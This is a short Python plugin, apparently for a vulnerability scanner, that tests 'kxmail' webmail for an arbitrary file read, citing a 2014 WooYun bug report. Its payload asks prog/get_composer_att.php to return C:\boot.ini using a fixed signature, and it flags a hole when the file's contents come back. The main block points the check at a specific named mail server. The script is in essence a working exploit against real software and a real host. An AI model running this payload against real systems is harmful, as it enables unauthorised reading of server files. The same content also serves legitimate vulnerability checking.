#!/usr/bin/python
#-*- encoding:utf-8 -*-
#__author__ = '鉴黄师'
#ref http://www.wooyun.org/bugs/wooyun-2014-066892

def assign(service, arg):
    if service == "kxmail":
        return True, arg


def audit(arg):
    payload = 'prog/get_composer_att.php?att_size=1623&filenamepath=C:\\boot.ini&maxatt_sign=4bc882e8c4a98ac7a97acd321aad4f88&attach_filename=boot.ini'
    url = arg + payload
    code, head,res, errcode, _ = curl.curl2(url)
    if code == 200 and "[boot loader]" in res and '[operating systems]' in res:
        security_hole(url)
                        
if __name__ == '__main__':
    from dummy import *
    audit(assign('kxmail', 'http://mail.ccpc.cq.cn/')[1])